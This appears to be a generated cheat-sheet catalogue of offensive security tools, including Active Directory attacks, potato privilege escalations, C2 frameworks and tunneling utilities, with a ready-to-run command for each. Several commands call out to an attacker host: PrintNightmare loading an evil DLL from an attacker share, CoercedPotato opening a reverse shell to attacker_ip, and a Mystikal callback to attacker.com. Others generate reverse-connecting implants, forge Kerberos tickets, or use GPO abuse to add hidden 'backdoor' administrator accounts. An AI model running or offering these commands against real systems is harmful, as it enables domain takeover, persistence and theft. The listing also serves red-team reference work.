# Privilege Escalation & Post-Exploitation
> Source: HackTools | Entries: 84 | Platform: cross_platform


## Index

- [active_directory](#activedirectory)
- [AD CS Abuse](#ad-cs-abuse)
- [AD CS Enumeration](#ad-cs-enumeration)
- [AD CS Exploitation](#ad-cs-exploitation)
- [c2_framework](#c2framework)
- [Certificate Abuse](#certificate-abuse)
- [cloud_security](#cloudsecurity)
- [email_security](#emailsecurity)
- [GPO Abuse](#gpo-abuse)
- [kerberos_relay](#kerberosrelay)
- [linux_post_exploitation](#linuxpostexploitation)
- [macos_security](#macossecurity)
- [ntlm_relay](#ntlmrelay)
- [payload_generation](#payloadgeneration)
- [post_exploitation](#postexploitation)
- [Privilege Escalation](#privilege-escalation)
- [privilege_escalation](#privilegeescalation)
- [proxy](#proxy)
- [rat](#rat)
- [Shadow Credentials](#shadow-credentials)
- [tunneling](#tunneling)


### active_directory

#### Golden Ticket
Kerberos attack technique that forges Ticket Granting Tickets (TGT) using the krbtgt account's NTLM hash, granting un...
**Categories:** active_directory, credential_access, kerberos_attack, technique, persistence, domain_dominance
```
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:HASH /ptt
```

#### noPac
Exploit tool for CVE-2021-42278 and CVE-2021-42287 (sAMAccountName/noPac) that allows low-privileged domain users to...
**Categories:** active_directory, privilege_escalation, exploit_tool, domain_attack, kerberos_attack
```
python3 noPac.py domain.local/user:password -dc-ip 10.0.0.1 --impersonate Administrator -dump
```

#### PrintNightmare
Exploit implementations for CVE-2021-1675 and CVE-2021-34527 (PrintNightmare) that abuse Windows Print Spooler servic...
**Categories:** active_directory, privilege_escalation, exploit_tool, remote_code_execution, critical_vulnerability
```
python3 CVE-2021-1675.py domain.local/user:password@target '\\attacker\share\evil.dll'
```

#### Silver Ticket
Kerberos attack technique that forges service tickets (TGS) using a compromised service account's NTLM hash, granting...
**Categories:** active_directory, credential_access, kerberos_attack, technique, persistence
```
mimikatz # kerberos::golden /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:cifs /rc4:HASH /user:Administrator /ptt
```

#### ZeroLogon
Exploit implementation for CVE-2020-1472 (Zerologon) that allows unauthenticated attackers to completely compromise A...
**Categories:** active_directory, privilege_escalation, exploit_tool, domain_attack, critical_vulnerability
```
python3 zerologon_tester.py DC01 10.0.0.1
```

### AD CS Abuse

#### ADCSPwn
Tool that exploits AD CS web enrollment endpoints via NTLM relay to request certificates on behalf of relayed machine...
**Categories:** AD CS Abuse, NTLM Relay, ESC8, Privilege Escalation, Machine Account Abuse
```
ADCSPwn.exe --adcs ca01.corp.local --port 9001
```

#### ForgeCert
C# tool that forges certificates using a stolen Certificate Authority (CA) private key and certificate. Creates golde...
**Categories:** AD CS Abuse, Golden Certificate, Persistence, Certificate Forgery, Privilege Escalation
```
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword 'P@ss' --Subject 'CN=User' --SubjectAltName admin@corp.local --NewCertPath admin.pfx --NewCertPassword 'P@ss'
```

### AD CS Enumeration

#### Certify
C# tool for enumerating and abusing Active Directory Certificate Services (AD CS) misconfigurations. Identifies vulne...
**Categories:** AD CS Enumeration, AD CS Abuse, Privilege Escalation, Certificate Abuse, ESC1-ESC8
```
Certify.exe find /vulnerable
```

### AD CS Exploitation

#### Certipy
Python-based AD CS exploitation tool (Impacket-based) that enumerates, abuses, and exploits Active Directory Certific...
**Categories:** AD CS Exploitation, Certificate Abuse, Privilege Escalation, PKINIT Abuse, Shadow Credentials
```
certipy find -u user@corp.local -p 'P@ss' -dc-ip 10.0.0.1 -vulnerable -stdout
```

### c2_framework

#### Ares
Python-based C2 framework with web-based management interface. Lightweight design with agents written in Python. Supp...
**Categories:** c2_framework, python, lightweight_c2, post_exploitation
```
python3 server.py
```

#### Cobalt Strike
Commercial adversary simulation platform widely abused by threat actors. Deploys 'beacon' implants that communicate v...
**Categories:** c2_framework, adversary_simulation, post_exploitation, red_team
```
execute-assembly /path/to/Seatbelt.exe -group=all
```

#### Covenant
.NET-based C2 framework with web interface. Uses 'Grunt' implants written in C#. Default listener on port 80/443. Web...
**Categories:** c2_framework, red_team, dotnet_implant, post_exploitation
```
dotnet run --project Covenant/Covenant.csproj --urls https://0.0.0.0:7443
```

#### DeimosC2
Go-based C2 framework with web UI supporting multiple agent types. Agents compiled for Windows, Linux, and macOS. Sup...
**Categories:** c2_framework, golang, red_team, post_exploitation
```
deimos --https --port 443 --host 0.0.0.0
```

#### Empire
PowerShell and Python post-exploitation framework (formerly PowerShell Empire, now with Starkiller GUI). Uses encrypt...
**Categories:** c2_framework, post_exploitation, powershell, red_team
```
python3 empire --rest --restport 1337
```

#### Havoc
Modern open-source C2 framework with a 'Demon' agent. Written in C/C++ with a Qt-based GUI. Demon agent supports indi...
**Categories:** c2_framework, red_team, post_exploitation, adversary_simulation
```
demon spawn x64 smb --listener https_listener
```

#### Koadic
Windows post-exploitation framework using Windows Script Host (JScript/VBScript) as implant runtime. Called 'COM Comm...
**Categories:** c2_framework, post_exploitation, windows_script_host, com_abuse
```
use stager/js/mshta; set SRVHOST 10.0.0.1; run
```

#### MacC2
macOS-focused C2 framework with Python-based server and macOS-native implant. Targets macOS-specific post-exploitatio...
**Categories:** c2_framework, macos, post_exploitation, apple_security
```
python3 macc2_server.py
```

#### Merlin
Go-based C2 framework supporting HTTP/1.1, HTTP/2, and HTTP/3 (QUIC) protocols. Agents are compiled Go binaries (larg...
**Categories:** c2_framework, red_team, golang, post_exploitation
```
merlinServer-Linux-x64 -i 0.0.0.0 -p 443 -proto h2
```

#### Metasploit Framework
Open-source penetration testing framework with extensive exploit and payload library. Meterpreter payloads operate as...
**Categories:** c2_framework, exploit_framework, penetration_testing, post_exploitation
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o payload.exe
```

#### Octopus
C2 framework using Windows Script Host (cscript.exe/wscript.exe) for agent execution. Agents delivered as obfuscated...
**Categories:** c2_framework, windows_script_host, post_exploitation
```
python3 octopus.py
```

#### PoshC2
PowerShell/C#/Python-based C2 framework with proxy-aware communications. Default HTTPS listener on port 443. Implants...
**Categories:** c2_framework, red_team, powershell, post_exploitation
```
posh-server
```

#### SILENTTRINITY
Post-exploitation C2 framework using IronPython and C# implants running on .NET CLR. Previously named 'ST'. Uses Boo...
**Categories:** c2_framework, post_exploitation, dotnet_implant, ironpython
```
python3 st.py teamserver --port 5000 <bind_ip> <password>
```

#### Sliver
Open-source cross-platform C2 framework written in Go by BishopFox. Generates implants as compiled Go binaries that a...
**Categories:** c2_framework, red_team, adversary_emulation, post_exploitation
```
generate --mtls 10.0.0.1:8888 --os windows --arch amd64 --format exe --save /tmp/implant.exe
```

### Certificate Abuse

#### PassTheCert
Tool that uses X.509 certificates for LDAP authentication via Schannel to perform Active Directory operations. Bypass...
**Categories:** Certificate Abuse, LDAP Abuse, RBCD Abuse, Shadow Credentials, Privilege Escalation
```
python3 passthecert.py -action ldap-shell -crt user.crt -key user.key -domain corp.local -dc-ip 10.0.0.1
```

### cloud_security

#### Pacu
Open-source AWS exploitation framework designed for offensive security testing of Amazon Web Services environments. D...
**Categories:** cloud_security, aws_exploitation, privilege_escalation
```
pacu --new-session target-assessment
```

#### PowerZure
PowerShell framework for Azure post-exploitation and resource manipulation. Detectable through Azure Resource Manager...
**Categories:** cloud_security, azure_exploitation, post_exploitation
```
Import-Module PowerZure.psd1; Show-AzureCurrentUser
```

### email_security

#### MailSniper
PowerShell-based tool for searching through email in Microsoft Exchange and Office 365 environments for sensitive dat...
**Categories:** email_security, credential_testing, password_spraying, exchange_security, post_exploitation
```
Invoke-SelfSearch -Mailbox user@target.com -ExchHostname mail.target.com -Terms 'password','credentials'
```

### GPO Abuse

#### GPOAbuse
Tool for abusing writable Group Policy Objects to achieve code execution, privilege escalation, or persistence in Act...
**Categories:** GPO Abuse, Privilege Escalation, Persistence, Lateral Movement, Code Execution
```
python3 gpoabuse.py corp.local/user:pass -gpo-id 6AC1786C-016F-11D2-945F-00C04fB984F9 -command 'net user backdoor P@ss123 /add && net localgroup administrators backdoor /add'
```

#### pyGPOAbuse
Python implementation of GPO abuse techniques (Impacket-based) that exploits writable Group Policy Objects remotely....
**Categories:** GPO Abuse, Privilege Escalation, Cross-Platform, Remote Exploitation, Impacket-Based
```
python3 pygpoabuse.py corp.local/user:pass -gpo-id 6AC1786C-016F-11D2-945F-00C04fB984F9 -command 'net user backdoor P@ss /add' -f
```

#### SharpGPOAbuse
C# tool for abusing writable Group Policy Objects to achieve privilege escalation and lateral movement. Adds immediat...
**Categories:** GPO Abuse, Privilege Escalation, Lateral Movement, Persistence, Code Execution
```
SharpGPOAbuse.exe --AddComputerTask --TaskName 'Update' --Author NT AUTHORITY\SYSTEM --Command cmd.exe --Arguments '/c net user backdoor P@ss /add' --GPOName 'Default Domain Policy'
```

### kerberos_relay

#### KrbRelay
Kerberos relay tool that relays Kerberos AP-REQ authentication to other services on the same or different hosts. Enab...
**Categories:** kerberos_relay, privilege_escalation, active_directory, rbcd_abuse, local_privilege_escalation
```
KrbRelay.exe -spn ldap/dc01.corp.local -clsid {752073A1-23F2-4396-85F0-8FDB879ED0ED} -rbcd S-1-5-... -port 10
```

### linux_post_exploitation

#### GTFONow
Automated GTFOBins exploitation tool that identifies SUID binaries, sudo permissions, and Linux capabilities that can...
**Categories:** linux_post_exploitation, privilege_escalation, gtfobins, automated_exploitation
```
python3 gtfonow.py
```

#### kernelpop
Kernel exploit identification and execution framework that detects vulnerable kernel versions and can automatically c...
**Categories:** linux_post_exploitation, privilege_escalation, kernel_exploitation, automated_exploitation
```
python3 kernelpop.py
```

#### LinEnum
Scripted Linux local enumeration and privilege escalation checker that performs comprehensive system information gath...
**Categories:** linux_post_exploitation, privilege_escalation, enumeration, system_information_gathering
```
bash LinEnum.sh
```

#### linux-exploit-suggester-2
Perl-based tool that identifies potential kernel exploits for privilege escalation by comparing the running kernel ve...
**Categories:** linux_post_exploitation, privilege_escalation, kernel_exploitation, vulnerability_identification
```
perl linux-exploit-suggester-2.pl
```

#### traitor
Automated Linux privilege escalation tool written in Go that exploits identified misconfigurations automatically rath...
**Categories:** linux_post_exploitation, privilege_escalation, automated_exploitation, container_escape
```
traitor --autopwn
```

#### unix-privesc-check
Shell script that checks for misconfigurations on Unix-like systems that could allow local unprivileged users to esca...
**Categories:** linux_post_exploitation, privilege_escalation, audit, system_hardening
```
unix-privesc-check standard
```

#### uptux
Linux privilege escalation checker specifically focused on systemd-based distributions that identifies exploitable mi...
**Categories:** linux_post_exploitation, privilege_escalation, systemd_security, audit
```
python3 uptux.py
```

### macos_security

#### MacPEAS
macOS privilege escalation enumeration script (part of the PEASS family) that performs comprehensive system reconnais...
**Categories:** macos_security, privilege_escalation, enumeration, credential_access, post_exploitation
```
bash linpeas.sh -a
```

#### Mystikal
macOS post-exploitation tool that leverages Apple's proprietary system frameworks and APIs for payload generation, pe...
**Categories:** macos_security, post_exploitation, persistence, privilege_escalation, payload_generation
```
python3 mystikal.py --payload launchagent --callback attacker.com:443
```

#### SwiftBelt
macOS post-exploitation enumeration tool written in Swift that gathers system information, security configurations, a...
**Categories:** macos_security, post_exploitation, enumeration, credential_access
```
./SwiftBelt
```

### ntlm_relay

#### ntlmrelayx
Impacket NTLM relay tool that intercepts NTLM authentication and relays it to target services. Supports relaying to S...
**Categories:** ntlm_relay, credential_relay, active_directory, lateral_movement, privilege_escalation
```
ntlmrelayx.py -t smb://192.168.1.100 -smb2support
```

### payload_generation

#### PowerDrop
PowerShell-based post-exploitation dropper that uses WMI event subscriptions and PowerShell for persistent payload de...
**Categories:** payload_generation, persistence, wmi_abuse, powershell_abuse
```
powershell -ep bypass -f PowerDrop.ps1
```

### post_exploitation

#### Mystikal
macOS-focused post-exploitation framework leveraging Apple system profiles and MDM (Mobile Device Management) attack...
**Categories:** post_exploitation, macos, mdm_abuse, configuration_profile
```
python3 mystikal.py
```

### Privilege Escalation

#### BeRoot
Privilege escalation enumeration tool for Windows, Linux, and macOS that checks for common misconfigurations. Identif...
**Categories:** Privilege Escalation
```
beRoot.exe
```

#### CoercedPotato
Privilege escalation tool that combines multiple Windows authentication coercion techniques (PrintSpoofer, EfsPotato,...
**Categories:** Privilege Escalation
```
CoercedPotato.exe --revshell attacker_ip 4444
```

#### EfsPotato
Privilege escalation tool exploiting the Encrypting File System Remote Protocol (MS-EFSRPC) for token impersonation....
**Categories:** Privilege Escalation
```
EfsPotato.exe cmd.exe
```

#### GenericPotato
Flexible token impersonation tool that provides a generic framework for various potato-style privilege escalation att...
**Categories:** Privilege Escalation
```
GenericPotato.exe -m HTTP -p 8888 -e cmd.exe
```

#### GodPotato
Universal Windows privilege escalation tool that works across all Windows versions from 8 to 11 and Server 2012 to 20...
**Categories:** Privilege Escalation
```
GodPotato.exe -cmd "cmd /c whoami"
```

#### JAWS
Just Another Windows (Enum) Script - PowerShell enumeration script for privilege escalation assessment. Performs netw...
**Categories:** Privilege Escalation
```
powershell.exe -ExecutionPolicy Bypass -File jaws-enum.ps1 -OutputFilename results.txt
```

#### JuicyPotato
Privilege escalation tool exploiting Windows COM/DCOM token impersonation (a weaponized version of RottenPotato). Abu...
**Categories:** Privilege Escalation
```
JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}
```

#### LinPEAS
Comprehensive Linux privilege escalation enumeration script (part of PEASS-ng suite). Performs automated checks for S...
**Categories:** Privilege Escalation
```
curl https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/linPEAS/linpeas.sh | sh
```

#### Linux-Exploit-Suggester
Tool that analyzes Linux kernel version and configuration to suggest applicable local privilege escalation exploits....
**Categories:** Privilege Escalation
```
./linux-exploit-suggester.sh
```

#### linux-smart-enumeration
Linux enumeration tool focused on privilege escalation with multiple verbosity levels. Performs graduated enumeration...
**Categories:** Privilege Escalation
```
./lse.sh
```

#### PEASS-ng
Privilege Escalation Awesome Scripts Suite - next generation. Comprehensive collection of privilege escalation enumer...
**Categories:** Privilege Escalation
```
winpeasx64.exe
```

#### PowerUp
PowerShell privilege escalation enumeration and exploitation module from the PowerSploit suite. Performs checks for s...
**Categories:** Privilege Escalation
```
Import-Module .\PowerUp.ps1; Invoke-AllChecks
```

#### PrintSpoofer
Privilege escalation tool exploiting the Windows Print Spooler service to escalate from SeImpersonatePrivilege to SYS...
**Categories:** Privilege Escalation
```
PrintSpoofer.exe -i -c cmd
```

#### PrivescCheck
Modern PowerShell privilege escalation enumeration script that serves as an updated alternative to PowerUp. Performs...
**Categories:** Privilege Escalation
```
Import-Module .\PrivescCheck.ps1; Invoke-PrivescCheck
```

#### pspy
Linux process monitoring tool that observes process creation without root privileges by monitoring the /proc filesyst...
**Categories:** Privilege Escalation
```
./pspy64
```

#### RoguePotato
Privilege escalation tool that improves upon JuicyPotato by using a remote OXID resolver to bypass restrictions on Wi...
**Categories:** Privilege Escalation
```
RoguePotato.exe -r attacker_ip -e "cmd /c whoami" -l 9999
```

#### RottenPotato
Original token impersonation privilege escalation tool that abuses the BITS COM server to negotiate a SYSTEM token. T...
**Categories:** Privilege Escalation
```
rottenpotato.exe
```

#### Seatbelt
Comprehensive C# security-oriented host survey tool that performs extensive enumeration of system security configurat...
**Categories:** Privilege Escalation
```
Seatbelt.exe -group=all -full
```

#### SharpUp
C# port of PowerUp privilege escalation checks. Performs comprehensive enumeration of common Windows privilege escala...
**Categories:** Privilege Escalation
```
SharpUp.exe audit
```

#### Sherlock
PowerShell script for finding missing Windows patches that could be exploited for local privilege escalation. Predece...
**Categories:** Privilege Escalation
```
Import-Module .\Sherlock.ps1; Find-AllVulns
```

#### sudo_killer
Tool focused on identifying and exploiting sudo misconfigurations for privilege escalation. Analyzes sudoers rules, s...
**Categories:** Privilege Escalation
```
./sudo_killer.sh
```

#### SweetPotato
Collection of privilege escalation techniques combining multiple potato exploits (JuicyPotato, PrintSpoofer, EfsPotat...
**Categories:** Privilege Escalation
```
SweetPotato.exe -p cmd.exe -a "/c whoami"
```

#### Watson
C# tool for enumerating missing Windows KBs and identifying known privilege escalation vulnerabilities. Compares inst...
**Categories:** Privilege Escalation
```
Watson.exe
```

#### WinPEAS
Comprehensive Windows privilege escalation enumeration script (part of PEASS-ng suite). Performs extensive automated...
**Categories:** Privilege Escalation
```
winpeasx64.exe
```

### privilege_escalation

#### KrbRelayUp
Universal local privilege escalation tool that automates the KrbRelay RBCD attack chain. Combines Kerberos relay with...
**Categories:** privilege_escalation, kerberos_relay, rbcd_abuse, local_privilege_escalation, active_directory
```
KrbRelayUp.exe relay -d corp.local -cn FAKEPC$ -cp Password123!
```

### proxy

#### proxychains-ng
Dynamic library preloading tool that forces arbitrary applications to route TCP connections through SOCKS4/5 or HTTP...
**Categories:** proxy, pivoting, socks_proxy, traffic_routing, post_exploitation
```
proxychains4 nmap -sT -Pn 10.10.10.0/24
```

### rat

#### Pupy
Cross-platform Python/C RAT with reflective DLL injection and in-memory execution. Supports Windows, Linux, macOS, an...
**Categories:** rat, cross_platform, python, reflective_injection, post_exploitation
```
pupygen -O windows -A x64 -t ssl -T connect --host 10.0.0.1:443 -o agent.exe
```

### Shadow Credentials

#### Whisker
C# tool for performing shadow credential attacks by manipulating the msDS-KeyCredentialLink attribute on Active Direc...
**Categories:** Shadow Credentials, AD CS Abuse, Privilege Escalation, Persistence, PKINIT Abuse
```
Whisker.exe add /target:targetuser /domain:corp.local /dc:dc01.corp.local
```

### tunneling

#### ABPTTS
A Black Path Toward The Sun - TCP tunneling over HTTP/HTTPS via webshell with robust encryption and traffic obfuscati...
**Categories:** tunneling, web_shell, http_tunnel, encrypted_tunnel, port_forwarding, post_exploitation
```
python abpttsfactory.py -o webshell.aspx
```

#### Chisel
Fast TCP/UDP tunnel over HTTP, used for creating encrypted reverse SOCKS proxies and port forwards through restrictiv...
**Categories:** tunneling, pivoting, socks_proxy, port_forwarding, post_exploitation
```
chisel server --reverse --port 8080
```

#### earthworm
Portable network tunneling tool (also known as 'ew') supporting SOCKS proxy and multi-level port forwarding across Li...
**Categories:** tunneling, socks_proxy, port_forwarding, pivoting, apt_tool, post_exploitation
```
ew -s ssocksd -l 1080
```

#### lcx
Classic Windows port forwarding tool used for TCP port redirection. One of the earliest and most widely used pivoting...
**Categories:** tunneling, port_forwarding, pivoting, post_exploitation, legacy_tool
```
lcx.exe -listen 4444 33389
```

#### ligolo-ng
Advanced tunneling tool using TUN interfaces to create transparent network pivots without SOCKS. Establishes encrypte...
**Categories:** tunneling, pivoting, network_routing, post_exploitation, tun_interface
```
ligolo-ng proxy -selfcert -laddr 0.0.0.0:11601
```

#### Neo-reGeorg
Upgraded version of reGeorg with encryption, header customization, and improved evasion. Tunnels SOCKS5 traffic throu...
**Categories:** tunneling, web_shell, socks_proxy, http_tunnel, encrypted_tunnel, post_exploitation
```
python neoreg.py generate -k password123 -o webshells/
```

#### plink
PuTTY Link command-line SSH client for Windows, commonly abused for creating SSH tunnels, reverse port forwards, and...
**Categories:** tunneling, ssh_tunnel, port_forwarding, pivoting, post_exploitation
```
plink.exe -ssh -l user -pw password -R 9999:127.0.0.1:3389 attacker_ip
```

#### reGeorg
Web shell-based SOCKS proxy that tunnels traffic through HTTP/HTTPS via a deployed web shell on a compromised web ser...
**Categories:** tunneling, web_shell, socks_proxy, http_tunnel, post_exploitation
```
python reGeorgSocksProxy.py -p 8080 -u http://target/tunnel.aspx
```

#### rpivot
Reverse SOCKS proxy tool enabling tunneling of traffic through a compromised machine via a reverse connection. Design...
**Categories:** tunneling, pivoting, socks_proxy, reverse_proxy, post_exploitation
```
python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-port 1080
```

#### SharpSocks
C# reverse SOCKS proxy tunneling traffic through HTTP/HTTPS for .NET environments. Creates a SOCKS proxy on the attac...
**Categories:** tunneling, socks_proxy, http_tunnel, reverse_proxy, dotnet, post_exploitation
```
SharpSocksServer.exe -s http://0.0.0.0:8080 -c http://0.0.0.0:8081 --socksport 1080
```

#### Stowaway
Multi-hop proxy tool designed for penetration testers to build node-based proxy chains through multiple compromised h...
**Categories:** tunneling, pivoting, multi_hop_proxy, socks_proxy, port_forwarding, post_exploitation
```
stowaway admin -l 9999 -s secretkey
```

#### Tunna
HTTP tunnel tool wrapping TCP connections within HTTP, enabling tunneling of any TCP service through web server websh...
**Categories:** tunneling, web_shell, http_tunnel, port_forwarding, post_exploitation
```
python proxy.py -u http://target/conn.aspx -l 4444 -r 3389 -a 10.0.0.5
```
